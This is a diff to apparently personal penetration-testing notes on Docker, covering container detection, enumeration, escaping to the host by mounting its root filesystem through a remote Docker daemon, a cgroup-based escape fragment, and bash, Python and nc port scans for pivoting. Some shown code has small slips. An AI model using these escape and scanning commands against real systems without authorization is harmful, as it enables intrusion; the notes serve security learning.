@@ -1,16 +1,29 @@
 # Docker Hacking
-For basic information about docker try here: [[Intro-To-Docker]].
-How do you know you are in a docker container?
-[pspy](https://github.com/DominicBreuker/pspy) on Linux or Systernals proc\*-related tools or access with tasklist for windows.
 
-## How to know when you are in a container
+
+For basic information about docker try here: [[Intro-To-Docker]].
+Containers have networking capabilities and their own file storage. They achieve this by using three components of the Linux kernel:
+
+-   Namespaces - segregate system resources such as processes, files, and memory away from other namespaces.
+-   Cgroups - Cgroups are used by containerization software such as LXC or Docker
+-   OverlayFS
+
+Typically you are trying to escape from a  container and general these escapes stem from misconfigurations of the container from services or access controls.
+
+## How to know when you are in a container?
+[pspy](https://github.com/DominicBreuker/pspy) on Linux or Systernals proc\*-related tools or access with tasklist for windows.
 ```bash
 .dockerenv
-# with pspy 
-cat /proc/$pid/cgroup | grep docker
+ps aux # Lack of processes
+
+cat /proc/1/cgroup 
+cat /proc/1/cgroup | grep docker
 ```
 
 [Deepce](https://github.com/stealthcopter/deepce.git) is like PEAS-NG for Docker
+
+Docker has a socket [[Networks/Network-Protocols]] on 5000 so that another host can send commands to it, not default, but possible.
+
 
 ## Preface
 Add IP and domain name to /etc/hosts
@@ -31,14 +44,12 @@ systemctl stop docker
 systemctl start docker
 ```
 
-## Docker Commands
-
+Docker Commands
 ```bash
 RUN echo "Docker"
 COPY 
 ````
-
-[Commands](https://docs.docker.com/engine/reference/commandline/cli/)
+For full list see [Commands](https://docs.docker.com/engine/reference/commandline/cli/)
 
 ##  Docker Enumeration
 On target machine enumerate the lay of the land:
@@ -54,19 +65,21 @@ docker config ls
 ```bash
 # Check routing
 ip a
-
 ```
 
 [cli Tool](https://github.com/containers/skopeo)
 
 ## GTFOBins/docker
+
+```bash
+docker images ls # list images required
+```
 [gtofbins](https://gtfobins.github.io/gtfobins/docker/#shell)
 
 ## Accessing Docker Container and exec..
 ```
 docker -H $remotehost run -v /:/mnt --rm -it -d $image:$tag
 docker -H $remotehost run -v /:/mnt --rm -it $image:$tag chroot /mnt sh
-
 ```
 
 ## Abusing Docker Registry
@@ -140,9 +153,43 @@ chmod a+x /cmd
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 ```
 
+## No ping and you need to pivot
+
+Q: What is the Default Gateway for the Docker Container?
+
+Use `/dev/tcp/ipaddr/port` or python
+
+```bash
+#!/bin/bash   
+ports=(21 22 53 80 443 3306 8443 8080)   
+for port in ${ports[@]}; do   
+	timeout 1 
+	bash -c "echo \"Port Scan Test\" > /dev/tcp/1.1.1.1/$port && echo $port is open || /dev/null"    
+done
+```
+
+
+```python
+#!/usr/bin/python3
+import socket
+host = "1.1.1.1"
+portList = [21,22,53,80,443,3306,8443,8080]
+for port in portList:
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        try:
+            s.connect((host,port))
+            print("Port ", port, " is open")
+        except:
+            print("Port ", port, " is closed")
+```
+
+N
+`nc -zv 192.168.100.1 1-65535`
+
 ## References
 
 [Docker](https://docs.docker.com/get-started/overview/)
 [THM Room Docker Rodeo](https://tryhackme.com/room/dockerrodeo)
 [trailofbits](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so.)
 [cgroups](https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt)
+[Commands](https://docs.docker.com/engine/reference/commandline/cli/)
